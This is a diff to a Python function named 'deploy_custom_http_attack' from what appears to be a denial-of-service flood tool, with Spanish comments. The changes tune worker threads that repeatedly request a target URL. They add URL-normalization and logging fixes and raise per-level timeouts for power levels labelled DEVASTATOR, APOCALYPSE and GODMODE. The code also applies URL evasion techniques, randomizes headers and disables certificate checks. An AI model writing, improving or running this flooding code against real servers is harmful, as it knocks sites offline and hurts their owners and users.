@@ -4202,31 +4202,41 @@ def deploy_custom_http_attack():
     def worker(worker_id: int):
         """Worker thread optimizado para máximo rendimiento"""
         try:
-            # Usar ConnectionManager para mejor gestión de conexiones (ya optimizado)
-            session = ConnectionManager.get_session(TARGET, worker_id)
+            # Normalizar TARGET - quitar barra final si existe (puede causar problemas de conexión)
+            normalized_target = TARGET.rstrip('/') if TARGET.endswith('/') and TARGET.count('/') > 3 else TARGET
             
-            # Configurar timeout muy corto para máximo throughput y más requests
-            # Timeouts más agresivos = más requests por segundo
+            # Usar ConnectionManager para mejor gestión de conexiones (ya optimizado)
+            session = ConnectionManager.get_session(normalized_target, worker_id)
+            
+            # Configurar timeout - balance entre throughput y éxito de conexión
+            # Timeouts muy cortos pueden causar muchos errores si el servidor es lento o está bajo carga
             if POWER_LEVEL in ["DEVASTATOR", "APOCALYPSE", "GODMODE"]:
-                request_timeout = 2  # Muy agresivo
+                request_timeout = 5  # Aumentado para evitar errores de timeout
             elif POWER_LEVEL in ["EXTREME", "HEAVY"]:
-                request_timeout = 3
+                request_timeout = 8  # Aumentado
             elif POWER_LEVEL in ["MEDIUM"]:
-                request_timeout = 5
+                request_timeout = 10
             else:
-                request_timeout = 8
+                request_timeout = 15  # Aumentado para MODERATE y niveles menores
             
             end_time = time.time() + DURATION
             request_count = 0
             last_rate_check = time.time()
             rate_adjustment = 1.0
             
-            # Pre-calentar conexiones
+            # Pre-calentar conexiones con URL normalizada y mejor logging
             if CONNECTION_WARMUP:
                 try:
-                    session.get(TARGET, headers=get_random_headers(), timeout=5, verify=False)
-                except:
-                    pass
+                    warmup_response = session.get(normalized_target, headers=get_random_headers(), timeout=10, verify=False, allow_redirects=True)
+                    if warmup_response.status_code:
+                        log_message("DEBUG", f"✅ [WORKER {worker_id}] Precalentamiento exitoso: HTTP {warmup_response.status_code}")
+                    else:
+                        log_message("WARN", f"⚠️ [WORKER {worker_id}] Precalentamiento: sin código de estado")
+                except Exception as warmup_error:
+                    error_type = type(warmup_error).__name__
+                    error_msg = str(warmup_error)[:150]
+                    log_message("WARN", f"⚠️ [WORKER {worker_id}] Error en precalentamiento: {error_type}: {error_msg}")
+                    # Continuar de todas formas - puede ser que el servidor esté lento o bajo carga
             
             # Contador de requests exitosos vs errores para ajuste dinámico
             consecutive_errors = 0
@@ -4247,9 +4257,13 @@ def deploy_custom_http_attack():
                         consecutive_errors = 0
                     
                     # Seleccionar target (si hay variaciones)
-                    target_url = TARGET
+                    target_url = normalized_target
                     if TARGET_VARIATIONS:
-                        target_url = random.choice([TARGET] + TARGET_VARIATIONS)
+                        target_url = random.choice([normalized_target] + TARGET_VARIATIONS)
+                    
+                    # Normalizar URL - quitar barra final si existe (puede causar problemas)
+                    if target_url.endswith('/') and target_url.count('/') > 3:
+                        target_url = target_url.rstrip('/')
                     
                     # Aplicar técnicas de evasión a la URL
                     target_url = apply_url_evasion(target_url)
@@ -4352,12 +4366,20 @@ def deploy_custom_http_attack():
                     attack_stats["errors"].append(str(e))
                     attack_stats["requests_sent"] += 1  # Contar intento aunque falle
                     error_msg = str(e)
-                    # Loggear errores importantes
-                    if "Connection" in error_msg or "timeout" in error_msg.lower() or "SSL" in error_msg:
-                        if request_count % 10 == 0:  # Loggear cada 10 errores para no saturar
-                            log_message("WARN", f"Worker {worker_id}: {error_msg[:100]}")
-                    elif DEBUG_MODE:
-                        log_message("DEBUG", f"Error en worker {worker_id}: {error_msg[:100]}")
+                    error_type = type(e).__name__
+                    
+                    # Loggear los primeros errores en detalle para diagnóstico
+                    if request_count < 5 or consecutive_errors < 5:
+                        log_message("ERROR", f"❌ [WORKER {worker_id}] Error #{request_count}: {error_type}: {error_msg[:200]} | URL: {target_url[:100]}")
+                    
+                    # Loggear errores importantes más frecuentemente
+                    if "Connection" in error_msg or "timeout" in error_msg.lower() or "SSL" in error_msg or "refused" in error_msg.lower():
+                        if request_count % 5 == 0:  # Loggear cada 5 errores para diagnóstico
+                            log_message("WARN", f"⚠️ [WORKER {worker_id}] Error de conexión #{request_count}: {error_type}: {error_msg[:150]}")
+                    elif DEBUG_MODE or request_count < 10:
+                        log_message("DEBUG", f"🔍 [WORKER {worker_id}] Error #{request_count}: {error_type}: {error_msg[:150]}")
+                    
+                    consecutive_errors += 1
                     # Pequeño delay en caso de error para no saturar
                     time.sleep(0.01)
                 
